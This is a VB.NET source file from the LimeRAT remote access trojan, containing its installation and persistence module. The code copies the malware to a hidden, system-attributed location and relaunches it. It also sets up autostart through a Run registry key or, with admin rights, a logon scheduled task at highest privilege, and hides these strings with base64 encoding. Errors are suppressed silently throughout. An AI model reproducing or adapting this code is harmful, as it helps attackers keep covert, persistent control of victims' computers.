Namespace Lime

    Public Class C_Installation

        Public Shared Sub INS()

            If C_Settings.DROP Then
                If Windows.Forms.Application.ExecutablePath <> C_Settings.fullpath Then
                    Try

                        Prepare()
                        AddDrop(C_Settings.fullpath)
                        AddReg(C_ID.Privileges)

                        C_CriticalProcesses.CriticalProcesses_Disable()
                        Diagnostics.Process.Start(C_Settings.fullpath)
                        End
                    Catch : End Try
                End If
            Else
                C_Settings.fullpath = Windows.Forms.Application.ExecutablePath
            End If

        End Sub

        Private Shared Sub Prepare()
            Try
                If Not IO.Directory.Exists(Environ(C_Settings.PATH1) & "\" & C_Settings.PATH2) Then
                    IO.Directory.CreateDirectory(Environ(C_Settings.PATH1) & "\" & C_Settings.PATH2)
                ElseIf IO.File.Exists(C_Settings.fullpath) Then
                    IO.File.Delete(C_Settings.fullpath)
                End If
            Catch : End Try
        End Sub

        Private Shared Sub AddDrop(ByVal Location As String)
            Try
                Dim NewFile As New IO.FileStream(Location, IO.FileMode.CreateNew)
                Dim LEXEBYTES As Byte() = IO.File.ReadAllBytes(Windows.Forms.Application.ExecutablePath)
                NewFile.Write(LEXEBYTES, 0, LEXEBYTES.Length)
                NewFile.Flush()
                NewFile.Close()
                IO.File.SetAttributes(C_Settings.fullpath, IO.FileAttributes.System + IO.FileAttributes.Hidden)
            Catch : End Try
        End Sub

        Private Shared Sub AddReg(ByVal Privileges As Boolean)
            Try
                If Privileges = True Then
                    'Microsoft.Win32.Registry.LocalMachine.CreateSubKey(BS(Convert.FromBase64String("U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuXA=="))).SetValue(C_Settings.EXE, C_Settings.fullpath)
                    '"schtasks /create /f /sc ONLOGON /RL HIGHEST /tn LimeRAT-Admin /tr "
                    Shell(BS(Convert.FromBase64String("c2NodGFza3MgL2NyZWF0ZSAvZiAvc2MgT05MT0dPTiAvUkwgSElHSEVTVCAvdG4gTGltZVJBVC1BZG1pbiAvdHIg")) + """'" & C_Settings.fullpath & "'""", AppWinStyle.Hide, False, -1)
                Else
                    Microsoft.Win32.Registry.CurrentUser.CreateSubKey(BS(Convert.FromBase64String("U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuXA=="))).SetValue(C_Settings.EXE, C_Settings.fullpath)
                End If
            Catch : End Try
        End Sub

    End Class

End Namespace
